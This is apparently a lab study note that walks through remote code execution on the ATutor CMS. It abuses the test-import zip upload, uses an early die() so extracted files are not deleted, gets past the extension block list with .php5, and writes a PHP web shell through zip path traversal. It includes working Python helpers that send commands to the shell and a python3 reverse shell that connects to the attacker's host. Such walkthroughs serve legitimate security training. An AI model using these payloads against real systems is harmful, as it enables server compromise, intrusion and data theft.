# Remote Code Execution

## Bypassing File Upload Filters

- To gain RCE from authenticated access, can try to abuse file upload functionality within the application. Since ATutor is a CMS, it stands to reason that there should be some functionality to upload files.

### Zip File Bypass

In ATutor, one of the platforms to upload files is in the `Tests and Surveys` section. 

- When we upload a text file, we get an error message saying that “The file does not appear to be a valid ZIP file”. We can use this python script to write a text file and generate a ZIP file:
    
    ```python
    import zipfile
    from io import BytesIO
    
    def _build_zip():
        f = BytesIO()
        z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
        z.writestr('poc/poc.txt', 'offsec')
        z.close()
        zip = open('poc.zip','wb')
        zip.write(f.getvalue())
        zip.close()
    
    _build_zip()
    ```
    
- After uploading a ZIP of a text file, the error message is that the “IMS manifest file is missing”, suggesting that the ZIP file must contain specific data. We can search for the error message in the source code to identify where the error is coming from.
    
    ```bash
    grep -rnw "IMS manifest file is missing" /var/www/html/ATutor --color
    Output: /var/www/html/ATutor/include/install/db/atutor_language_text.sql
    
    We find that the error messages are defined specifically in that file, and we can use
    the error messages code to find the functionality.
    
    grep -rnw "NO_IMSMANIFEST" /var/www/html/ATutor --color
    Output:
    /var/www/html/ATutor/mods/_standard/tests/question_import.php
    /var/www/html/ATutor/mods/_standard/tests/import_test.php
    /var/www/html/ATutor/mods/_core/imscp/ims_import.php
    
    This gives us the files import_test.php and question_import.php
    ```
    

Looking inside `import_test.php`, we find that the code is checking for the file imsmanifest.xml and returning an error if not present. PHP code: 

```php
$ims_manifest_xml = @file_get_contents($import_path.'imsmanifest.xml');
 
if ($ims_manifest_xml === false) {
$msg->addError('NO_IMSMANIFEST');

if (file_exists($import_path . 'atutor_backup_version')) {
		$msg->addError('NO_IMS_BACKUP');
}
```

- We also need to pass XML file validation by creating a valid XML file.

```php
$xml_parser = xml_parser_create();

xml_parser_set_option($xml_parser, XML_OPTION_CASE_FOLDING, false); /* conform to W3C specs */
xml_set_element_handler($xml_parser, 'startElement', 'endElement');
xml_set_character_data_handler($xml_parser, 'characterData');

if (!xml_parse($xml_parser, $ims_manifest_xml, true)) {
	  die(sprintf("XML error: %s at line %d",
    xml_error_string(xml_get_error_code($xml_parser)),
 		xml_get_current_line_number($xml_parser)));
}
xml_parser_free($xml_parser);
```

- A valid XML file can be created with **`z.writestr('imsmanifest.xml', '<validTag></validTag>')`** in the Python script.
- However, upon further inspection, we find that the code will later delete the unzipped files, preventing us from using them to gain RCE. The `die` statement in the XML parsing will enable us to terminate the program and prevent the files from being deleted, allowing us to gain RCE.

```php
[line 335] clr_dir(AT_CONTENT_DIR . 'import/'.$_SESSION['course_id']);
```

- As such, we upload a ZIP file that contains a poc.txt and an invalid `imsmanifest.xml` file. This PHP is terminated early and hence our `poc.txt` file is not deleted.

```bash
sudo find / -name "poc.txt" 2>/dev/null
Output: /var/content/import/16777215/poc/poc.txt
```

### File Extension Bypass

Inside `import_tests.php`, we see the function `preImportCalledBack` is used to check the extracted files

```php
/* extract the entire archive into AT_COURSE_CONTENT . import/$course using the call back function to filter out php files */
error_reporting(0);
$archive = new PclZip($_FILES['file']['tmp_name']);
if ($archive->extract(	PCLZIP_OPT_PATH,	$import_path,
 							PCLZIP_CB_PRE_EXTRACT,	'preImportCallBack') == 0) {
 		$msg->addError('IMPORT_FAILED');
 		echo 'Error : '.$archive->errorInfo(true);
 		clr_dir($import_path);
 		header('Location: questin_db.php');
 		exit;
}
error_reporting(AT_ERROR_REPORTING);
```

Searching for `preImportCallBack`, we find the function definition in `filemanager.inc.php`

```bash
grep -rnw . -e "function preImportCallBack" --color
```

```php
function preImportCallBack($p_event, &$p_header) {
 		global $IllegalExtentions;
 
 		if ($p_header['folder'] == 1) {
 			  return 1;
 		}

 		$path_parts = pathinfo($p_header['filename']);
 		$ext = $path_parts['extension'];
 
 		if (in_array($ext, $IllegalExtentions)) {
 		    return 0;
 		}

 		return 1;
}
```

We search for the config definition of `$IllegalExtensions` to find what extensions are disallowed. 

```bash
grep -rnw . -e "illegal_extensions" --color
```

```php
$_config_defaults['illegal_extentions']
        = 'exe|asp|php|php3|bat|cgi|pl|com|vbs|reg|pcd|pif|scr|bas|inf|vb|vbe|wsc|wsf|wsh';
```

- As such, we can use extensions like `.php5` and `.phtml` to inject our malicious web shell.

## File Upload to RCE

When writing file uploads with directory traversal to RCE, we require 3 conditions

- Knowledge of the web root to know where to traverse to
- Writable location inside web root to write files
- File extension that can execute PHP code

We can use a directory traversal attack to break out of our jail to write the file to custom locations. This can be done by writing a file into the ZIP folder with the `..\` characters in the file path.

- Since we previously found the path of poc.txt to be `/var/content/import/16777215/poc/poc.txt`, we require 4 layers of ../ to exit.

```python
z.writestr('../../../../tmp/poc/poc.txt', 'offsec')
```

### Webroot

In white box situation, we will already have the web root available

If `display_errors` configuration is enabled, can use Parameter Pollution and send a GET request with arrays injected as parameters. 

- Since most back-end code do not expect arrays as values, this could trigger errors and disclose the path to PHP code files

### Writable Directories

With a white box approach, we can just list writable directories. From there, we can modify the path of the file injected by our directory traversal. 

```bash
find /var/www/html/ -type d -perm -o+w
Output: /var/www/html/ATutor/mods
```

For black box approaches, we can either use an information disclosure or brute force the web application paths. 

With the web root and accepted extensions, we can inject our malicious file. 

```python
z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
```

## RCE

For our remote code execution, we can send a GET request to our uploaded file.

```python
def send_command(ip, session, command):
    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
    r = session.get(target)

    return r.text
```

## Reverse Shell

We send a `python3` reverse shell to gain a shell.  

```python
def send_reverse_shell(ip, session):
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 80

    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    send_command(ip, session, payload)
```